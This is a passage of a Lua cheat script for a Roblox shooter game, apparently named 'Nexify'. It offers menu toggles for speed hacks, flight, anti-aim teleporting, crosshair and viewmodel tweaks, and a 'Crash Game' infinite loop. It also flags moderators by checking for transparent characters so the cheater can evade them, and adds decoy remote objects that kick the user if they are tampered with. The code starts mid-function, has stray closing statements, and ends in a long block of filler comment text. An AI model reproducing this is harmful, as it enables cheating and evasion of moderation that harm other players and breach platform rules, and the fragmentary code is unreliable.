        local gravityMultiplier = 11  -- Default value set by the slider (will change dynamically)

        -- Slider to adjust gravity multiplier (you can implement this as needed)

        local heartbeatConnection

        local function applyCustomGravity()
            local humanoid = character:FindFirstChild("Humanoid")
            local rootPart = character:FindFirstChild("HumanoidRootPart")
            if not humanoid or not rootPart then return end
            
            local humanoidState = humanoid:GetState()
            
            if humanoidState == Enum.HumanoidStateType.Jumping or humanoidState == Enum.HumanoidStateType.Freefall then
                local customGravityVelocity = gravityDirection * gravityMultiplier
                if not wasInAir then
                    rootPart.AssemblyLinearVelocity = rootPart.AssemblyLinearVelocity + customGravityVelocity
                    wasInAir = true
                end
            else
                wasInAir = false
            end
        end

        if state3 then
            -- Start applying custom gravity
            heartbeatConnection = game:GetService("RunService").Heartbeat:Connect(function()
                if character and character:FindFirstChild("HumanoidRootPart") then
                    applyCustomGravity()
                end
            end)
        else
            -- Stop applying custom gravity
            if heartbeatConnection then
                heartbeatConnection:Disconnect()
                heartbeatConnection = nil
            end
            
            -- Reset the gravity effect when toggled off
            local rootPart = character:FindFirstChild("HumanoidRootPart")
            if rootPart then
                rootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)  -- Reset velocity
            end
            wasInAir = false  -- Reset the air state
        end
    end
})


charactertab:AddSlider('speedhack', {
    Text = 'Player Speed',
    Default = 17,
    Min = 16,
    Max = 30.1,
    Rounding = 2,
    Compact = true
}):OnChanged(function(value)
    getgenv().speedMultiplier = value 
end)




Players = game:GetService("Players")
 Player = Players.LocalPlayer
 Character = Player.Character or Player.CharacterAdded:Wait()
 Humanoid = Character:WaitForChild("Humanoid")
 RootPart = Character:WaitForChild("HumanoidRootPart")
 Head = Character:WaitForChild("Head")
 Camera = game:GetService("Workspace").CurrentCamera
 UserInputService = game:GetService("UserInputService")

antiAimEnabled = false  

 function applyAntiAim()
    
    RootPart.CFrame = RootPart.CFrame * CFrame.Angles(0, math.rad(180), 0)  
    local headPos = Head.Position
    RootPart.Position = Vector3.new(headPos.X, headPos.Y - 2, headPos.Z)  
    Camera.CFrame = CFrame.new(Camera.CFrame.Position, Camera.CFrame.Position + Camera.CFrame.LookVector)  
end
function asswhiletruedo()

while true do
    if antiAimEnabled then
        applyAntiAim()  
    end
    wait(0.001)  
end
end

coroutine.wrap(asswhiletruedo)

charactertab:AddToggle('Anti Aim Level 2', {
    Text = 'Anti Aim Level 2',
    Default = false,
    Risky = true,
    Callback = function(isEnabled)
        
        antiAimEnabled = isEnabled
    end
})





function isPlayerTransparent(player)
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        for _, part in pairs(player.Character:GetChildren()) do
            if part:IsA("BasePart") then
                if part.Transparency > 0 then
                    return true
                end
            end
        end
    end
    return false
end


game.Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(character)
        
        if isPlayerTransparent(player) then
            library:Notify("MODERATOR FOUND:" ..player.Name, 30)
        end
    end)
end)



getgenv().speedMultiplier = 17
getgenv().speedHackEnabled = false


 player = game.Players.LocalPlayer
 character = player.Character or player.CharacterAdded:Wait()
 humanoidRootPart = character:WaitForChild("HumanoidRootPart")
 humanoid = character:WaitForChild("Humanoid")


function updateVelocity()
    if getgenv().speedHackEnabled then
        local moveDirection = humanoid.MoveDirection
        if moveDirection.Magnitude > 0 then
            humanoidRootPart.Velocity = moveDirection * getgenv().speedMultiplier
        else
            humanoidRootPart.Velocity = Vector3.new(0, 0, 0)
        end
    end
end


if getgenv().speedHackEnabled then
    getgenv().speedConnection = game:GetService("RunService").Heartbeat:Connect(updateVelocity)
end



charactertab:AddToggle('flight3', {
    Text = 'Flight',
    Risky = true,
    Default = false,
    Callback = function(state3)
        getgenv().Fly3 = state3
    end
}):AddKeyPicker('flight_key3', {
    Default = 'nil',
    SyncToggleState = true,
    Mode = 'Toggle',
    Text = 'Flight',
    NoUI = false,
    Callback = function(value3)
        
    end
})


    charactertab:AddSlider('flightspeed',
        { Text = 'flight speed', Default = 23, Min = 1, Max = 35, Rounding = 1, Compact = true }):OnChanged(function(
        first)
        getgenv().speed3 = first
    end)
        end
        local players = game:GetService("Players")
	for _, player in pairs(game.Players:GetPlayers()) do
    if player.Character then
        if chamsEnabled then
            applyHighlight(player)
        else
            removeHighlight(player)
        end
    end
end
charactertab:AddToggle('Toggle Crosshair', {
    Text = 'Toggle Crosshair',
    Default = false,
    Callback = function(isEnabled)
        _G.CrosshairEnabled = isEnabled  
    end
    
})


charactertab:AddSlider('Crosshair Thickness', {
    Text = 'Crosshair Thicknes',
    Default = 1,
    Min = 1,
    Max = 4,
    Rounding = 0,
    Compact = false,

    Callback = function(Value)
VerticalLine.Thickness = Value
HorizontalLine.Thickness = Value
    end
})


charactertab:AddLabel('Crosshair Color Picker'):AddColorPicker('Crosshair Color Picker', {
    Default = ViewModelSettings.Color,
    Title = 'Crosshair Color Picker',
    Transparency = 0,

    Callback = function(Value)
        
        HorizontalLine.Color = Value
        VerticalLine.Color = Value
    end
})


viewmodelEnabled = false
xOffset, yOffset, zOffset = 0, 0, 0


function updateViewmodelOffset()
    
    local viewmodel = game.Workspace.Camera:FindFirstChild("ViewModel")
    if viewmodel then
        local camera = game.Workspace.CurrentCamera
        
        if camera and viewmodel then
            local newPosition = camera.CFrame.Position + camera.CFrame:VectorToWorldSpace(Vector3.new(xOffset, yOffset, zOffset))
            
            
            for _, part in pairs(viewmodel:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CFrame = CFrame.new(newPosition)
                end
            end
        end
    end
end


charactertab:AddToggle('viewq131425346yjrurefwgergrfgtjyuksedvgrtjh', {
    Text = 'Viewmodel Toggle',
    Default = false,
    Callback = function(isEnabled)
        
        viewmodelEnabled = isEnabled
        
        
        if viewmodelEnabled then
            
            game:GetService("RunService").Heartbeat:Connect(function()
                updateViewmodelOffset()
            end)
        end
    end
})


charactertab:AddSlider('X', {
    Text = 'X Value',
    Default = 0,
    Min = -5,
    Max = 5,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)

    end
})


charactertab:AddSlider('Y', {
    Text = 'Y Value',
    Default = 0,
    Min = -5,
    Max = 5,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)

    end
})


charactertab:AddSlider('Z', {
    Text = 'Z Value',
    Default = 0,
    Min = -5,
    Max = 5,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)
        
        zOffset = Value
        
        if viewmodelEnabled then
            updateViewmodelOffset()
        end
    end
})



charactertab:AddToggle('Remove Clouds', {
    Text = 'Remove Clouds',
    Default = false,
    Callback = function(isEnabled)
        terrain = game:GetService("Workspace").Terrain

        
        if isEnabled then
            terrain.Clouds.Density = 0
        else
            
            terrain.Clouds.Density = 1
        end
    end
})


 charactertab:AddButton('Crash Game', function()


while true do
print("crassshhhh")

    end

 end)


folderName = "Nexifyfunctions"
NexifyFolder = Instance.new("Folder")
NexifyFolder.Name = folderName
NexifyFolder.Parent = Workspace


 remote1 = Instance.new("RemoteEvent")
 remote4 = Instance.new("BoolValue")
 remote2 = Instance.new("RemoteEvent")

remote1.Name = " ? YQ     Q   "
remote4.Name = "!DONT TOUCH ANYTHING HERE!"
remote2.Name = "!5 YQ    5Q    Q  "

remote1.Parent = NexifyFolder
remote2.Parent = NexifyFolder
remote4.Parent = NexifyFolder


local function changeRemoteNames()
    while true do
        wait(1)  
        
        
        if remote1 and remote2 then
            if math.random() > 0.8 then
                remote1.Name = " ? YQ     Q   "
                remote2.Name = "!5 YQ    5Q    Q  "
                remote4.Name = "!DONT TOUCH ANYTHING HERE!"
            else
                remote1.Name = "!5 YQ    5Q    Q  "
                remote2.Name = " ? YQ     Q   "
                remote4.Name = "!!!DONT TOUCH ANYTHING HERE!!!"
            end
        end

        
        if not NexifyFolder:IsDescendantOf(Workspace) or not remote1:IsDescendantOf(NexifyFolder) or not remote2:IsDescendantOf(NexifyFolder) then
            local player = Players.LocalPlayer  
            if player then


wait(3)
                player:Kick("Nexify Function Removal")  
            end
            break
        end
    end
end


coroutine.wrap(changeRemoteNames)()

print("created functions")











--[[
    asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
        asddasasddasasddasasddasasddas
